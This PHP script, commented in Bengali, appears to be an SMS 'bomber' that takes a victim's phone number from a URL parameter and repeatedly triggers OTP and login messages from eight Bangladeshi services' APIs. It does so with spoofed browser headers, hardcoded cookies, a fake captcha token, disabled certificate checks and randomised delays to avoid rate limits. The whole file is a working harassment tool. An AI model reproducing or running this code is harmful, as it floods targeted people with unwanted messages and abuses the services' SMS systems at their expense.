<?php
header('Content-Type: application/json');
set_time_limit(0); 
error_reporting(0); // কোনো ওয়ার্নিং যেন আউটপুট নষ্ট না করে

$phone = $_GET['phone'] ?? '';
if(empty($phone)) {
    die(json_encode(["status" => "error", "message" => "Phone number missing. Use ?phone=017XXXXXXXX"]));
}

// ফোন নাম্বার ফরমেটিং
$phone_11 = (substr($phone, 0, 2) === "88") ? substr($phone, 2) : $phone;
if(substr($phone_11, 0, 1) !== "0") { $phone_11 = "0".$phone_11; } // নিশ্চিত করা যেন ১১ ডিজিট হয়

$phone_88 = "88" . $phone_11;
$phone_plus88 = "+88" . $phone_11;

$results = [];

// ১. Shwapno (৫ বার)
for($i=1; $i<=5; $i++){
    sleep(rand(3, 5));
    $ch = curl_init();
    curl_setopt_array($ch, [
        CURLOPT_URL => 'https://www.shwapno.com/api/auth',
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_CUSTOMREQUEST => 'POST',
        CURLOPT_POSTFIELDS => json_encode(["phoneNumber" => $phone_plus88]),
        CURLOPT_HTTPHEADER => [
            'Content-Type: application/json',
            'User-Agent: Mozilla/5.0 (Linux; Android 10)',
            'origin: https://www.shwapno.com',
            'referer: https://www.shwapno.com/',
            'cookie: cuid=98a49521-6662-498f-94eb-17d71974083f; _nc_=true; _ds_=65eb62a4452e887cd78e256b'
        ],
    ]);
    $res = curl_exec($ch);
    $results["shwapno_$i"] = json_decode($res, true) ?: "Sent";
    curl_close($ch);
}

// ২. Garibook (৫ বার)
for($i=1; $i<=5; $i++){
    sleep(rand(3, 5));
    $ch = curl_init();
    curl_setopt_array($ch, [
        CURLOPT_URL => 'https://api.garibookadmin.com/api/v4/user/login',
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_POST => 1,
        CURLOPT_POSTFIELDS => json_encode(["mobile" => $phone_plus88, "recaptcha_token" => "garibookcaptcha", "channel" => "web"]),
        CURLOPT_HTTPHEADER => [
            'Content-Type: application/json',
            'User-Agent: Mozilla/5.0 (Linux; Android 10)',
            'Origin: https://garibook.com',
            'Referer: https://garibook.com/'
        ],
    ]);
    $res = curl_exec($ch);
    $results["garibook_$i"] = json_decode($res, true) ?: "Sent";
    curl_close($ch);
}

// ৩. Shikho (৩ বার)
for($i=1; $i<=3; $i++){
    sleep(rand(2, 4));
    $ch = curl_init();
    curl_setopt_array($ch, [
        CURLOPT_URL => 'https://api.shikho.com/auth/v2/send/sms',
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_POST => 1,
        CURLOPT_POSTFIELDS => json_encode(["phone" => $phone_88, "type" => "student", "auth_type" => "signup"]),
        CURLOPT_HTTPHEADER => ['Content-Type: application/json', 'Origin: https://shikho.com']
    ]);
    $res = curl_exec($ch);
    $results["shikho_$i"] = json_decode($res, true) ?: "Sent";
    curl_close($ch);
}

// ৪. RedX (১০ বার)
for($i=1; $i<=10; $i++){
    sleep(rand(2, 4));
    $ch = curl_init();
    curl_setopt_array($ch, [
        CURLOPT_URL => 'https://api.redx.com.bd/v1/merchant/registration/generate-registration-otp',
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_POST => 1,
        CURLOPT_POSTFIELDS => json_encode(["phoneNumber" => $phone_11]),
        CURLOPT_HTTPHEADER => ['Content-Type: application/json']
    ]);
    $res = curl_exec($ch);
    $results["redx_$i"] = json_decode($res, true) ?: "Sent";
    curl_close($ch);
}

// ৫. Bikroy (১০ বার)
for($i=1; $i<=10; $i++){
    sleep(rand(2, 4));
    $ch = curl_init();
    curl_setopt_array($ch, [
        CURLOPT_URL => "https://bikroy.com/data/phone_number_login/verifications/phone_login?phone=$phone_11",
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_HTTPHEADER => ['User-Agent: Mozilla/5.0']
    ]);
    $res = curl_exec($ch);
    $results["bikroy_$i"] = json_decode($res, true) ?: "Sent";
    curl_close($ch);
}

// ৬. PBS (৫ বার)
for($i=1; $i<=5; $i++){
    sleep(rand(2, 4));
    $ch = curl_init();
    curl_setopt_array($ch, [
        CURLOPT_URL => 'https://apialpha.pbs.com.bd/api/OTP/generateOTP',
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_POST => 1,
        CURLOPT_POSTFIELDS => json_encode(["userPhone" => $phone_11]),
        CURLOPT_HTTPHEADER => ['Content-Type: application/json']
    ]);
    $res = curl_exec($ch);
    $results["pbs_$i"] = json_decode($res, true) ?: "Sent";
    curl_close($ch);
}

// ৭. Iqra Live (৩ বার)
for($i=1; $i<=3; $i++){
    sleep(rand(2, 4));
    $ch = curl_init();
    curl_setopt_array($ch, [
        CURLOPT_URL => "https://apibeta.iqra-live.com/api/v2/sent-otp/".$phone_11,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_HTTPHEADER => ['User-Agent: Mozilla/5.0']
    ]);
    $res = curl_exec($ch);
    $results["iqra_$i"] = json_decode($res, true) ?: "Sent";
    curl_close($ch);
}

// ৮. BDTickets (১০ বার)
for($i=1; $i<=10; $i++){
    sleep(rand(6, 9)); 
    $ch = curl_init();
    curl_setopt_array($ch, [
        CURLOPT_URL => 'https://api.bdtickets.com:20100/v1/auth',
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_POST => 1,
        CURLOPT_POSTFIELDS => json_encode(["createUserCheck" => true, "phoneNumber" => $phone_plus88, "applicationChannel" => "WEB_APP"]),
        CURLOPT_HTTPHEADER => [
            'Content-Type: application/json',
            'Host: api.bdtickets.com:20100',
            'Origin: https://bdtickets.com',
            'Referer: https://bdtickets.com/',
            'User-Agent: Mozilla/5.0 (Linux; Android 10)'
        ],
    ]);
    $res = curl_exec($ch);
    $results["bdtickets_$i"] = json_decode($res, true) ?: "Sent";
    curl_close($ch);
}

echo json_encode(["status" => "completed", "results" => $results], JSON_PRETTY_PRINT);
?>
